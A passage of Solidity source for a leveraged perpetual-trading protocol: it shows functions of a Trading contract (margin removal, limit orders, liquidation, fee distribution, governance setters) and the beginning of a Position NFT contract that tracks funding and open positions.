signature\n     * @param _trader address the trade is initiated for\n     */\n    function removeMargin(\n        uint256 _id,\n        address _stableVault,\n        address _outputToken,\n        uint256 _removeMargin,\n        PriceData calldata _priceData,\n        bytes calldata _signature,\n        address _trader\n    )\n        external\n    {\n        _validateProxy(_trader);\n        _checkOwner(_id, _trader);\n        _checkVault(_stableVault, _outputToken);\n        IPosition.Trade memory _trade = position.trades(_id);\n        if (_trade.orderType != 0) revert(); //IsLimit\n        IPairsContract.Asset memory asset = pairsContract.idToAsset(_trade.asset);\n        uint256 _newMargin = _trade.margin - _removeMargin;\n        uint256 _newLeverage = _trade.margin * _trade.leverage / _newMargin;\n        if (_newLeverage > asset.maxLeverage) revert(\"!lev\");\n        (uint _assetPrice,) = tradingExtension.getVerifiedPrice(_trade.asset, _priceData, _signature, 0);\n        (,int256 _payout) = TradingLibrary.pnl(_trade.direction, _assetPrice, _trade.price, _newMargin, _newLeverage, _trade.accInterest);\n        unchecked {\n            if (_payout <= int256(_newMargin*(DIVISION_CONSTANT-liqPercent)/DIVISION_CONSTANT)) revert LiqThreshold();\n        }\n        position.modifyMargin(_trade.id, _newMargin, _newLeverage);\n        _handleWithdraw(_trade, _stableVault, _outputToken, _removeMargin);\n        emit MarginModified(_trade.id, _newMargin, _newLeverage, false, _trader);\n    }\n\n    /**\n     * @param _type true for TP, false for SL\n     * @param _id position id\n     * @param _limitPrice TP/SL trigger price\n     * @param _priceData verifiable off-chain price data\n     * @param _signature node signature\n     * @param _trader address the trade is initiated for\n     */\n    function updateTpSl(\n        bool _type,\n        uint _id,\n        uint _limitPrice,\n        PriceData calldata _priceData,\n        bytes calldata _signature,\n        address _trader\n    )\n        external\n    {\n        _validateProxy(_trader);\n        _checkOwner(_id, _trader);\n        IPosition.Trade memory _trade = position.trades(_id);\n        if (_trade.orderType != 0) revert(\"4\"); //IsLimit\n        if (_type) {\n            position.modifyTp(_id, _limitPrice);\n        } else {\n            (uint256 _price,) = tradingExtension.getVerifiedPrice(_trade.asset, _priceData, _signature, 0);\n            _checkSl(_limitPrice, _trade.direction, _price);\n            position.modifySl(_id, _limitPrice);\n        }\n        emit UpdateTPSL(_id, _type, _limitPrice, _trader);\n    }\n\n    /**\n     * @param _id position id\n     * @param _priceData verifiable off-chain price data\n     * @param _signature node signature\n     */\n    function executeLimitOrder(\n        uint _id, \n        PriceData calldata _priceData,\n        bytes calldata _signature\n    ) \n        external\n    {\n        unchecked {\n            _checkDelay(_id, true);\n            tradingExtension._checkGas();\n            if (tradingExtension.paused()) revert TradingPaused();\n            require(block.timestamp >= limitDelay[_id]);\n            IPosition.Trade memory trade = position.trades(_id);\n            uint _fee = _handleOpenFees(trade.asset, trade.margin*trade.leverage/1e18, trade.trader, trade.tigAsset, true);\n            (uint256 _price, uint256 _spread) = tradingExtension.getVerifiedPrice(trade.asset, _priceData, _signature, 0);\n            if (trade.orderType == 0) revert(\"5\");\n            if (_price > trade.price+trade.price*limitOrderPriceRange/DIVISION_CONSTANT || _price < trade.price-trade.price*limitOrderPriceRange/DIVISION_CONSTANT) revert(\"6\"); //LimitNotMet\n            if (trade.direction && trade.orderType == 1) {\n                if (trade.price < _price) revert(\"6\"); //LimitNotMet\n            } else if (!trade.direction && trade.orderType == 1) {\n                if (trade.price > _price) revert(\"6\"); //LimitNotMet\n            } else if (!trade.direction && trade.orderType == 2) {\n                if (trade.price < _price) revert(\"6\"); //LimitNotMet\n                trade.price = _price;\n            } else {\n                if (trade.price > _price) revert(\"6\"); //LimitNotMet\n                trade.price = _price;\n            } \n            if(trade.direction) {\n                trade.price += trade.price * _spread / DIVISION_CONSTANT;\n            } else {\n                trade.price -= trade.price * _spread / DIVISION_CONSTANT;\n            }\n            if (trade.direction) {\n                tradingExtension.modifyLongOi(trade.asset, trade.tigAsset, true, trade.margin*trade.leverage/1e18);\n            } else {\n                tradingExtension.modifyShortOi(trade.asset, trade.tigAsset, true, trade.margin*trade.leverage/1e18);\n            }\n            _updateFunding(trade.asset, trade.tigAsset);\n            position.executeLimitOrder(_id, trade.price, trade.margin - _fee);\n            emit LimitOrderExecuted(trade.asset, trade.direction, trade.price, trade.leverage, trade.margin - _fee, _id, trade.trader, _msgSender());\n        }\n    }\n\n    /**\n     * @notice liquidate position\n     * @param _id id of the position NFT\n     * @param _priceData verifiable off-chain data\n     * @param _signature node signature\n     */\n    function liquidatePosition(\n        uint _id,\n        PriceData calldata _priceData,\n        bytes calldata _signature\n    )\n        external\n    {\n        unchecked {\n            tradingExtension._checkGas();\n            IPosition.Trade memory _trade = position.trades(_id);\n            if (_trade.orderType != 0) revert(\"4\"); //IsLimit\n\n            (uint256 _price,) = tradingExtension.getVerifiedPrice(_trade.asset, _priceData, _signature, 0);\n            (uint256 _positionSizeAfterPrice, int256 _payout) = TradingLibrary.pnl(_trade.direction, _price, _trade.price, _trade.margin, _trade.leverage, _trade.accInterest);\n            uint256 _positionSize = _trade.margin*_trade.leverage/1e18;\n            if (_payout > int256(_trade.margin*(DIVISION_CONSTANT-liqPercent)/DIVISION_CONSTANT)) revert NotLiquidatable();\n            if (_trade.direction) {\n                tradingExtension.modifyLongOi(_trade.asset, _trade.tigAsset, false, _positionSize);\n            } else {\n                tradingExtension.modifyShortOi(_trade.asset, _trade.tigAsset, false, _positionSize);\n            }\n            _updateFunding(_trade.asset, _trade.tigAsset);\n            _handleCloseFees(_trade.asset, type(uint).max, _trade.tigAsset, _positionSizeAfterPrice, _trade.trader, true);\n            position.burn(_id);\n            emit PositionLiquidated(_id, _trade.trader, _msgSender());\n        }\n    }\n\n    /**\n     * @dev close position at a pre-set price\n     * @param _id id of the position NFT\n     * @param _tp true if take profit\n     * @param _priceData verifiable off-chain price data\n     * @param _signature node signature\n     */\n    function limitClose(\n        uint _id,\n        bool _tp,\n        PriceData calldata _priceData,\n        bytes calldata _signature\n    )\n        external\n    {\n        _checkDelay(_id, false);\n        (uint _limitPrice, address _tigAsset) = tradingExtension._limitClose(_id, _tp, _priceData, _signature);\n        _closePosition(_id, DIVISION_CONSTANT, _limitPrice, address(0), _tigAsset, true);\n    }\n\n    /**\n     * @notice Trader can approve a proxy wallet address for it to trade on its behalf. Can also provide proxy wallet with gas.\n     * @param _proxy proxy wallet address\n     * @param _timestamp end timestamp of approval period\n     */\n    function approveProxy(address _proxy, uint256 _timestamp) external payable {\n        proxyApprovals[_msgSender()] = Proxy(\n            _proxy,\n            _timestamp\n        );\n        payable(_proxy).transfer(msg.value);\n    }\n\n    // ===== INTERNAL FUNCTIONS =====\n\n    /**\n     * @dev close the initiated position.\n     * @param _id id of the position NFT\n     * @param _percent percent of the position being closed\n     * @param _price pair price\n     * @param _stableVault StableVault address\n     * @param _outputToken Token that trader will receive\n     * @param _isBot false if closed via market order\n     */\n    function _closePosition(\n        uint _id,\n        uint _percent,\n        uint _price,\n        address _stableVault,\n        address _outputToken,\n        bool _isBot\n    )\n        internal\n    {\n        (IPosition.Trade memory _trade, uint256 _positionSize, int256 _payout) = tradingExtension._closePosition(_id, _price, _percent);\n        position.setAccInterest(_id);\n        _updateFunding(_trade.asset, _trade.tigAsset);\n        if (_percent < DIVISION_CONSTANT) {\n            if ((_trade.margin*_trade.leverage*(DIVISION_CONSTANT-_percent)/DIVISION_CONSTANT)/1e18 < tradingExtension.minPos(_trade.tigAsset)) revert(\"!size\");\n            position.reducePosition(_id, _percent);\n        } else {\n            position.burn(_id);\n        }\n        uint256 _toMint;\n        if (_payout > 0) {\n            unchecked {\n                _toMint = _handleCloseFees(_trade.asset, uint256(_payout)*_percent/DIVISION_CONSTANT, _trade.tigAsset, _positionSize*_percent/DIVISION_CONSTANT, _trade.trader, _isBot);\n                if (maxWinPercent > 0 && _toMint > _trade.margin*maxWinPercent/DIVISION_CONSTANT) {\n                    _toMint = _trade.margin*maxWinPercent/DIVISION_CONSTANT;\n                }\n            }\n            _handleWithdraw(_trade, _stableVault, _outputToken, _toMint);\n        }\n        emit PositionClosed(_id, _price, _percent, _toMint, _trade.trader, _isBot ? _msgSender() : _trade.trader);\n    }\n\n    /**\n     * @dev handle stablevault deposits for different trading functions\n     * @param _tigAsset tigAsset token address\n     * @param _marginAsset token being deposited into stablevault\n     * @param _margin amount being deposited\n     * @param _stableVault StableVault address\n     * @param _permitData Data for approval via permit\n     * @param _trader Trader address to take tokens from\n     */\n    function _handleDeposit(address _tigAsset, address _marginAsset, uint256 _margin, address _stableVault, ERC20PermitData calldata _permitData, address _trader) internal {\n        IStable tigAsset = IStable(_tigAsset);\n        if (_tigAsset != _marginAsset) {\n            if (_permitData.usePermit) {\n                ERC20Permit(_marginAsset).permit(_trader, address(this), _permitData.amount, _permitData.deadline, _permitData.v, _permitData.r, _permitData.s);\n            }\n            uint256 _balBefore = tigAsset.balanceOf(address(this));\n            uint _marginDecMultiplier = 10**(18-ExtendedIERC20(_marginAsset).decimals());\n            IERC20(_marginAsset).transferFrom(_trader, address(this), _margin/_marginDecMultiplier);\n            IERC20(_marginAsset).approve(_stableVault, type(uint).max);\n            IStableVault(_stableVault).deposit(_marginAsset, _margin/_marginDecMultiplier);\n            if (tigAsset.balanceOf(address(this)) != _balBefore + _margin) revert BadDeposit();\n            tigAsset.burnFrom(address(this), tigAsset.balanceOf(address(this)));\n        } else {\n            tigAsset.burnFrom(_trader, _margin);\n        }        \n    }\n\n    /**\n     * @dev handle stablevault withdrawals for different trading functions\n     * @param _trade Position info\n     * @param _stableVault StableVault address\n     * @param _outputToken Output token address\n     * @param _toMint Amount of tigAsset minted to be used for withdrawal\n     */\n    function _handleWithdraw(IPosition.Trade memory _trade, address _stableVault, address _outputToken, uint _toMint) internal {\n        IStable(_trade.tigAsset).mintFor(address(this), _toMint);\n        if (_outputToken == _trade.tigAsset) {\n            IERC20(_outputToken).transfer(_trade.trader, _toMint);\n        } else {\n            uint256 _balBefore = IERC20(_outputToken).balanceOf(address(this));\n            IStableVault(_stableVault).withdraw(_outputToken, _toMint);\n            if (IERC20(_outputToken).balanceOf(address(this)) != _balBefore + _toMint/(10**(18-ExtendedIERC20(_outputToken).decimals()))) revert BadWithdraw();\n            IERC20(_outputToken).transfer(_trade.trader, IERC20(_outputToken).balanceOf(address(this)) - _balBefore);\n        }        \n    }\n\n    /**\n     * @dev handle fees distribution for opening\n     * @param _asset asset id\n     * @param _positionSize position size\n     * @param _trader trader address\n     * @param _tigAsset tigAsset address\n     * @param _isBot false if opened via market order\n     * @return _feePaid total fees paid during opening\n     */\n    function _handleOpenFees(\n        uint _asset,\n        uint _positionSize,\n        address _trader,\n        address _tigAsset,\n        bool _isBot\n    )\n        internal\n        returns (uint _feePaid)\n    {\n        IPairsContract.Asset memory asset = pairsContract.idToAsset(_asset);\n        Fees memory _fees = openFees;\n        unchecked {\n            _fees.daoFees = _fees.daoFees * asset.feeMultiplier / DIVISION_CONSTANT;\n            _fees.burnFees = _fees.burnFees * asset.feeMultiplier / DIVISION_CONSTANT;\n            _fees.referralFees = _fees.referralFees * asset.feeMultiplier / DIVISION_CONSTANT;\n            _fees.botFees = _fees.botFees * asset.feeMultiplier / DIVISION_CONSTANT;\n        }\n        address _referrer = tradingExtension.getRef(_trader); //referrals.getReferral(referrals.getReferred(_trader));\n        if (_referrer != address(0)) {\n            unchecked {\n                IStable(_tigAsset).mintFor(\n                    _referrer,\n                    _positionSize\n                    * _fees.referralFees // get referral fee%\n                    / DIVISION_CONSTANT // divide by 100%\n                );\n            }\n            _fees.daoFees = _fees.daoFees - _fees.referralFees*2;\n        }\n        if (_isBot) {\n            unchecked {\n                IStable(_tigAsset).mintFor(\n                    _msgSender(),\n                    _positionSize\n                    * _fees.botFees // get bot fee%\n                    / DIVISION_CONSTANT // divide by 100%\n                );\n            }\n            _fees.daoFees = _fees.daoFees - _fees.botFees;\n        } else {\n            _fees.botFees = 0;\n        }\n        unchecked {\n            uint _daoFeesPaid = _positionSize * _fees.daoFees / DIVISION_CONSTANT;\n            _feePaid =\n                _positionSize\n                * (_fees.burnFees + _fees.botFees) // get total fee%\n                / DIVISION_CONSTANT // divide by 100%\n                + _daoFeesPaid;\n            emit FeesDistributed(\n                _tigAsset,\n                _daoFeesPaid,\n                _positionSize * _fees.burnFees / DIVISION_CONSTANT,\n                _referrer != address(0) ? _positionSize * _fees.referralFees / DIVISION_CONSTANT : 0,\n                _positionSize * _fees.botFees / DIVISION_CONSTANT,\n                _referrer\n            );\n            IStable(_tigAsset).mintFor(address(this), _daoFeesPaid);\n        }\n        gov.distribute(_tigAsset, IStable(_tigAsset).balanceOf(address(this)));\n    }\n\n    /**\n     * @dev handle fees distribution for closing\n     * @param _asset asset id\n     * @param _payout payout to trader before fees\n     * @param _tigAsset margin asset\n     * @param _positionSize position size\n     * @param _trader trader address\n     * @param _isBot false if closed via market order\n     * @return payout_ payout to trader after fees\n     */\n    function _handleCloseFees(\n        uint _asset,\n        uint _payout,\n        address _tigAsset,\n        uint _positionSize,\n        address _trader,\n        bool _isBot\n    )\n        internal\n        returns (uint payout_)\n    {\n        IPairsContract.Asset memory asset = pairsContract.idToAsset(_asset);\n        Fees memory _fees = closeFees;\n        uint _daoFeesPaid;\n        uint _burnFeesPaid;\n        uint _referralFeesPaid;\n        unchecked {\n            _daoFeesPaid = (_positionSize*_fees.daoFees/DIVISION_CONSTANT)*asset.feeMultiplier/DIVISION_CONSTANT;\n            _burnFeesPaid = (_positionSize*_fees.burnFees/DIVISION_CONSTANT)*asset.feeMultiplier/DIVISION_CONSTANT;\n        }\n        uint _botFeesPaid;\n        address _referrer = tradingExtension.getRef(_trader);//referrals.getReferral(referrals.getReferred(_trader));\n        if (_referrer != address(0)) {\n            unchecked {\n                _referralFeesPaid = (_positionSize*_fees.referralFees/DIVISION_CONSTANT)*asset.feeMultiplier/DIVISION_CONSTANT;\n            }\n            IStable(_tigAsset).mintFor(\n                _referrer,\n                _referralFeesPaid\n            );\n             _daoFeesPaid = _daoFeesPaid-_referralFeesPaid*2;\n        }\n        if (_isBot) {\n            unchecked {\n                _botFeesPaid = (_positionSize*_fees.botFees/DIVISION_CONSTANT)*asset.feeMultiplier/DIVISION_CONSTANT;\n                IStable(_tigAsset).mintFor(\n                    _msgSender(),\n                    _botFeesPaid\n                );\n            }\n            _daoFeesPaid = _daoFeesPaid - _botFeesPaid;\n        }\n        emit FeesDistributed(_tigAsset, _daoFeesPaid, _burnFeesPaid, _referralFeesPaid, _botFeesPaid, _referrer);\n        payout_ = _payout - _daoFeesPaid - _burnFeesPaid - _botFeesPaid;\n        IStable(_tigAsset).mintFor(address(this), _daoFeesPaid);\n        IStable(_tigAsset).approve(address(gov), type(uint).max);\n        gov.distribute(_tigAsset, _daoFeesPaid);\n        return payout_;\n    }\n\n    /**\n     * @dev update funding rates after open interest changes\n     * @param _asset asset id\n     * @param _tigAsset tigAsset used for OI\n     */\n    function _updateFunding(uint256 _asset, address _tigAsset) internal {\n        position.updateFunding(\n            _asset,\n            _tigAsset,\n            pairsContract.idToOi(_asset, _tigAsset).longOi,\n            pairsContract.idToOi(_asset, _tigAsset).shortOi,\n            pairsContract.idToAsset(_asset).baseFundingRate,\n            vaultFundingPercent\n        );\n    }\n\n    /**\n     * @dev check that SL price is valid compared to market price\n     * @param _sl SL price\n     * @param _direction long/short\n     * @param _price market price\n     */\n    function _checkSl(uint _sl, bool _direction, uint _price) internal pure {\n        if (_direction) {\n            if (_sl > _price) revert(\"3\"); //BadStopLoss\n        } else {\n            if (_sl < _price && _sl != 0) revert(\"3\"); //BadStopLoss\n        }\n    }\n\n    /**\n     * @dev check that trader address owns the position\n     * @param _id position id\n     * @param _trader trader address\n     */\n    function _checkOwner(uint _id, address _trader) internal view {\n        if (position.ownerOf(_id) != _trader) revert(\"2\"); //NotPositionOwner   \n    }\n\n    /**\n     * @notice Check that sufficient time has passed between opening and closing\n     * @dev This is to prevent profitable opening and closing in the same tx with two different prices in the \"valid signature pool\".\n     * @param _id position id\n     * @param _type true for opening, false for closing\n     */\n    function _checkDelay(uint _id, bool _type) internal {\n        unchecked {\n            Delay memory _delay = blockDelayPassed[_id];\n            if (_delay.actionType == _type) {\n                blockDelayPassed[_id].delay = block.number + blockDelay;\n            } else {\n                if (block.number < _delay.delay) revert(\"0\"); //Wait\n                blockDelayPassed[_id].delay = block.number + blockDelay;\n                blockDelayPassed[_id].actionType = _type;\n            }\n        }\n    }\n\n    /**\n     * @dev Check that the stablevault input is whitelisted and the margin asset is whitelisted in the vault\n     * @param _stableVault StableVault address\n     * @param _token Margin asset token address\n     */\n    function _checkVault(address _stableVault, address _token) internal view {\n        require(allowedVault[_stableVault], \"Unapproved stablevault\");\n        require(_token == IStableVault(_stableVault).stable() || IStableVault(_stableVault).allowed(_token), \"Token not approved in vault\");\n    }\n\n    /**\n     * @dev Check that the trader has approved the proxy address to trade for it\n     * @param _trader Trader address\n     */\n    function _validateProxy(address _trader) internal view {\n        if (_trader != _msgSender()) {\n            Proxy memory _proxy = proxyApprovals[_trader];\n            require(_proxy.proxy == _msgSender() && _proxy.time >= block.timestamp, \"Proxy not approved\");\n        }\n    }\n\n    // ===== GOVERNANCE-ONLY =====\n\n    /**\n     * @dev Sets block delay between opening and closing\n     * @notice In blocks not seconds\n     * @param _blockDelay delay amount\n     */\n    function setBlockDelay(\n        uint _blockDelay\n    )\n        external\n        onlyOwner\n    {\n        blockDelay = _blockDelay;\n    }\n\n    /**\n     * @dev Whitelists a stablevault contract address\n     * @param _stableVault StableVault address\n     * @param _bool true if allowed\n     */\n    function setAllowedVault(\n        address _stableVault,\n        bool _bool\n    )\n        external\n        onlyOwner\n    {\n        allowedVault[_stableVault] = _bool;\n    }\n\n    /**\n     * @dev Sets max payout % compared to margin\n     * @param _maxWinPercent payout %\n     */\n    function setMaxWinPercent(\n        uint _maxWinPercent\n    )\n        external\n        onlyOwner\n    {\n        maxWinPercent = _maxWinPercent;\n    }\n\n    /**\n     * @dev Sets executable price range for limit orders\n     * @param _range price range in %\n     */\n    function setLimitOrderPriceRange(uint _range) external onlyOwner {\n        limitOrderPriceRange = _range;\n    }\n\n    /**\n     * @dev Sets the fees for the trading protocol\n     * @param _open True if open fees are being set\n     * @param _daoFees Fees distributed to the DAO\n     * @param _burnFees Fees which get burned\n     * @param _referralFees Fees given to referrers\n     * @param _botFees Fees given to bots that execute limit orders\n     * @param _percent Percent of earned funding fees going to StableVault\n     */\n    function setFees(bool _open, uint _daoFees, uint _burnFees, uint _referralFees, uint _botFees, uint _percent) external onlyOwner {\n        unchecked {\n            require(_daoFees >= _botFees+_referralFees*2);\n            if (_open) {\n                openFees.daoFees = _daoFees;\n                openFees.burnFees = _burnFees;\n                openFees.referralFees = _referralFees;\n                openFees.botFees = _botFees;\n            } else {\n                closeFees.daoFees = _daoFees;\n                closeFees.burnFees = _burnFees;\n                closeFees.referralFees = _referralFees;\n                closeFees.botFees = _botFees;                \n            }\n            require(_percent <= DIVISION_CONSTANT);\n            vaultFundingPercent = _percent;\n        }\n    }\n\n    /**\n     * @dev Sets the extension contract address for trading\n     * @param _ext extension contract address\n     */\n    function setTradingExtension(\n        address _ext\n    ) external onlyOwner() {\n        tradingExtension = ITradingExtension(_ext);\n    }\n\n    // ===== EVENTS =====\n\n    event PositionOpened(\n        TradeInfo _tradeInfo,\n        uint _orderType,\n        uint _price,\n        uint _id,\n        address _trader,\n        uint _marginAfterFees\n    );\n\n    event PositionClosed(\n        uint _id,\n        uint _closePrice,\n        uint _percent,\n        uint _payout,\n        address _trader,\n        address _executor\n    );\n\n    event PositionLiquidated(\n        uint _id,\n        address _trader,\n        address _executor\n    );\n\n    event LimitOrderExecuted(\n        uint _asset,\n        bool _direction,\n        uint _openPrice,\n        uint _lev,\n        uint _margin,\n        uint _id,\n        address _trader,\n        address _executor\n    );\n\n    event UpdateTPSL(\n        uint _id,\n        bool _isTp,\n        uint _price,\n        address _trader\n    );\n\n    event LimitCancelled(\n        uint _id,\n        address _trader\n    );\n\n    event MarginModified(\n        uint _id,\n        uint _newMargin,\n        uint _newLeverage,\n        bool _isMarginAdded,\n        address _trader\n    );\n\n    event AddToPosition(\n        uint _id,\n        uint _newMargin,\n        uint _newPrice,\n        address _trader\n    );\n\n    event FeesDistributed(\n        address _tigAsset,\n        uint _daoFees,\n        uint _burnFees,\n        uint _refFees,\n        uint _botFees,\n        address _referrer\n    );\n}\n\n\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol\";\nimport \"@openzeppelin/contracts/utils/Counters.sol\";\nimport \"./utils/MetaContext.sol\";\nimport \"./interfaces/IPosition.sol\";\n\ncontract Position is ERC721Enumerable, MetaContext, IPosition {\n\n    function ownerOf(uint _id) public view override(ERC721, IERC721, IPosition) returns (address) {\n        return ERC721.ownerOf(_id);\n    }\n\n    using Counters for Counters.Counter;\n    uint constant public DIVISION_CONSTANT = 1e10; // 100%\n\n    mapping(uint => mapping(address => uint)) public vaultFundingPercent;\n\n    mapping(address => bool) private _isMinter; // Trading contract should be minter\n    mapping(uint256 => Trade) private _trades; // NFT id to Trade\n\n    uint256[] private _openPositions;\n    mapping(uint256 => uint256) private _openPositionsIndexes;\n\n    mapping(uint256 => uint256[]) private _assetOpenPositions;\n    mapping(uint256 => mapping(uint256 => uint256)) private _assetOpenPositionsIndexes;\n\n    mapping(uint256 => uint256[]) private _limitOrders; // List of limit order nft ids per asset\n    mapping(uint256 => mapping(uint256 => uint256)) private _limitOrderIndexes; // Keeps track of asset -> id -> array index\n\n    // Funding\n    mapping(uint256 => mapping(address => int256)) public fundingDeltaPerSec;\n    mapping(uint256 => mapping(address => mapping(bool => int256))) private accInterestPerOi;\n    mapping(uint256 => mapping(address => uint256)) private lastUpdate;\n    mapping(uint256 => int256) private initId;\n    mapping(uint256 => mapping(address => uint256)) private longOi;\n    mapping(uint256 => mapping(address => uint256)) private shortOi;\n\n    function isMinter(address _address) public view returns (bool) { return _isMinter[_address]; }\n    function trades(uint _id) public view returns (Trade memory) {\n        Trade memory _trade = _trades[_id];\n        _trade.trader = ownerOf(_id);\n        if (_trade.orderType > 0) return _trade;\n        \n        int256 _pendingFunding;\n        if (_trade.direction && longOi[_trade.asset][_trade.tigAsset] > 0) {\n            _pendingFunding = (int256(block.timestamp-lastUpdate[_trade.asset][_trade.tigAsset])*fundingDeltaPerSec[_trade.asset][_trade.tigAsset])*1e18/int256(longOi[_trade.asset][_trade.tigAsset]);\n            if (longOi[_trade.asset][_trade.tigAsset] > shortOi[_trade.asset][_trade.tigAsset]) {\n                _pendingFunding = -_pendingFunding;\n            } else {\n                _pendingFunding = _pendingFunding*int256(1e10-vaultFundingPercent[_trade.asset][_trade.tigAsset])/1e10;\n            }\n        } else if (shortOi[_trade.asset][_trade.tigAsset] > 0) {\n            _pendingFunding = (int256(block.timestamp-lastUpdate[_trade.asset][_trade.tigAsset])*fundingDeltaPerSec[_trade.asset][_trade.tigAsset])*1e18/int256(shortOi[_trade.asset][_trade.tigAsset]);\n            if (shortOi[_trade.asset][_trade.tigAsset] > longOi[_trade.asset][_trade.tigAsset]) {\n                _pendingFunding = -_pendingFunding;\n            } else {\n                _pendingFunding = _pendingFunding*int256(1e10-vaultFundingPercent[_trade.asset][_trade.tigAsset])/1e10;\n            }\n        }\n        _trade.accInterest += (int256(_trade.margin*_trade.leverage/1e18)*(accInterestPerOi[_trade.asset][_trade.tigAsset][_trade.direction]+_pendingFunding)/1e18)-initId[_id];\n        \n        return _trade;\n    }\n    function openPositions() public view returns (uint256[] memory) { return _openPositions; }\n    function openPositionsIndexes(uint _id) public view returns (uint256) { return _openPositionsIndexes[_id]; }\n    function assetOpenPositions(uint _asset) public view returns (uint256[] memory) { return _assetOpenPositions[_asset]; }\n    function assetOpenPositionsIndexes(uint _asset, uint _id) public view returns (uint256) { return _assetOpenPositionsIndexes[_asset][_id]; }\n    function limitOrders(uint _asset) public view returns (uint256[] memory) { return _limitOrders[_asset]; }\n    function limitOrderIndexes(uint _asset, uint _id) public view returns (uint256) { return _limitOrderIndexes[_asset][_id]; }\n\n    Counters.Counter private _tokenIds;\n    string public baseURI;\n\n    constructor(string memory _setBaseURI, string memory _name, string memory _symbol) ERC721(_name, _symbol) {\n        baseURI = _setBaseURI;\n        _tokenIds.increment();\n    }\n\n    function _baseURI() internal override view returns (string memory) {\n        return baseURI;\n    }\n\n    function setBaseURI(string memory _newBaseURI) external onlyOwner {\n        baseURI = _newBaseURI;\n    }\n\n    /**\n    * @notice Update funding rate after open interest change\n    * @dev only callable by minter\n    * @param _asset pair id\n    * @param _tigAsset tigAsset token address\n    * @param _longOi long open interest\n    * @param _shortOi short open interest\n    * @param _baseFundingRate base funding rate of a pair\n    * @param _vaultFundingPercent percent of earned funding going to the stablevault\n    */\n    function updateFunding(uint256 _asset, address _tigAsset, uint256 _longOi, uint256 _shortOi, uint256 _baseFundingRate, uint _vaultFundingPercent) external onlyMinter {\n        if(longOi[_asset][_tigAsset] < shortOi[_asset][_tigAsset]) {\n            if (longOi[_asset][_tigAsset] > 0) {\n                accInterestPerOi[_asset][_tigAsset][true] += ((int256(block.timestamp-lastUpdate[_asset][_tigAsset])*fundingDeltaPerSec[_asset][_tigAsset])*1e18/int256(longOi[_asset][_tigAsset]))*int256(1e10-vaultFundingPercent[_asset][_tigAsset])/1e10;\n            }\n            accInterestPerOi[_asset][_tigAsset][false] -= (int256(block.timestamp-lastUpdate[_asset][_tigAsset])*fundingDeltaPerSec[_asset][_tigAsset])*1e18/int256(shortOi[_asset][_tigAsset]);\n\n        } else if(longOi[_asset][_tigAsset] > shortOi[_asset][_tigAsset]) {\n            accInterestPerOi[_asset][_tigAsset][true] -= (int256(block.timestamp-lastUpdate[_asset][_tigAsset])*fundingDeltaPerSec[_asset][_tigAsset])*1e18/int256(longOi[_asset][_tigAsset]);\n            if (shortOi[_asset][_tigAsset] > 0) {\n                accInterestPerOi[_asset][_tigAsset][false] += ((int256(block.timestamp-lastUpdate[_asset][_tigAsset])*fundingDeltaPerSec[_asset][_tigAsset])*1e18/int256(shortOi[_asset][_tigAsset]))*int256(1e10-vaultFundingPercent[_asset][_tigAsset])/1e10;\n            }\n        }\n        lastUpdate[_asset][_tigAsset] = block.timestamp;\n        int256 _oiDelta;\n        if (_longOi > _shortOi) {\n            _oiDelta = int256(_longOi)-int256(_shortOi);\n        } else {\n            _oiDelta = int256(_shortOi)-int256(_longOi);\n        }\n        \n        fundingDeltaPerSec[_asset][_tigAsset] = (_oiDelta*int256(_baseFundingRate)/int256(DIVISION_CONSTANT))/31536000;\n        longOi[_asset][_tigAsset] = _longOi;\n        shortOi[_asset][_tigAsset] = _shortOi;\n        vaultFundingPercent[_asset][_tigAsset] = _vaultFundingPercent;\n    }\n\n    /**\n    * @notice mint a new position nft\n    * @dev only callable by minter\n    * @param _mintTrade New trade params in struct\n    */\n    function mint(\n        MintTrade memory _mintTrade\n    ) external onlyMinter {\n        uint newTokenID = _tokenIds.current();\n\n        Trade storage newTrade = _trades[newTokenID];\n        newTrade.margin = _mintTrade.margin;\n        newTrade.leverage = _mintTrade.leverage;\n        newTrade.asset = _mintTrade.asset;\n        newTrade.direction = _mintTrade.direction;\n        newTrade.price = _mintTrade.price;\n        newTrade.tpPrice = _mintTrade.tp;\n        newTrade.slPrice = _mintTrade.sl;\n        newTrade.orderType = _mintTrade.orderType;\n        newTrade.id = newTokenID;\n        newTrade.tigAsset = _mintTrade.tigAsset;\n\n        _safeMint(_mintTrade.account, newTokenID);\n        if (_mintTrade.orderType > 0) {\n            _limitOrders[_mintTrade.asset].push(newTokenID);\n            _limitOrderIndexes[_mintTrade.asset][newTokenID] = _limitOrders[_mintTrade.asset].length-1;\n        } else {\n            initId[newTokenID] = accInterestPerOi[_mintTrade.asset][_mintTrade.tigAsset][_mintTrade.direction]*int256(_mintTrade.margin*_mintTrade.leverage/1e18)/1e18;\n            _openPositions.push(newTokenID);\n            _openPositionsIndexes[newTokenID] = _openPositions.length-1;\n\n            _assetOpenPositions[_mintTrade.asset].push(newTokenID);\n            _assetOpenPositionsIndexes[_mintTrade.asset][newTokenID] = _assetOpenPositions[_mintTrade.asset].length-1;\n        }\n        _tokenIds.increment();\n    }\n\n    /**\n     * @param _id id of the position NFT\n     * @param _price price used for execution\n     * @param _newMargin margin after fees\n     */\n    function executeLimitOrder(uint256 _id, uint256 _price, uint256 _newMargin) external onlyMinter {\n        Trade storage _trade = _trades[_id];\n        if (_trade.orderType == 0) {\n            return;\n        }\n        _trade.orderType = 0;\n        _trade.price = _price;\n        _trade.margin = _newMargin;\n        uint _asset = _trade.asset;\n        _limitOrderIndexes[_asset][_limitOrders[_asset][_limitOrders[_asset].length-1]] = _limitOrderIndexes[_asset][_id];\n        _limitOrders[_asset][_limitOrderIndexes[_asset][_id]] = _limitOrders[_asset][_limitOrders[_asset].length-1];\n        delete _limitOrderIndexes[_asset][_id];\n        _limitOrders[_asset].pop();\n\n        _openPositions.push(_id);\n        _openPositionsIndexes[_id] = _openPositions.length-1;\n        _assetOpenPositions[_asset].push(_id);\n        _assetOpenPositionsIndexes[_asset][_id] = _assetOpenPositions[_asset].length-1;\n\n        initId[_id] = accInterestPerOi[_trade.asset][_trade.tigAsset][_trade.direction]*int256(_trade.margin*_trade.leverage/1e18)/1e18;\n    }\n\n    /**\n    * @notice modifies margin and leverage\n    * @dev only callable by minter\n    * @param _id position id\n    * @param _newMargin new margin amount\n    * @param _newLeverage new leverage amount\n    */\n    function modifyMargin(uint256 _id, uint256 _newMargin, uint256 _newLeverage) external onlyMinter {\n        _trades[_id].margin = _newMargin;\n        _trades[_id].leverage = _newLeverage;\n    }\n\n    /**\n    * @notice modifies margin and entry price\n    * @dev only callable by 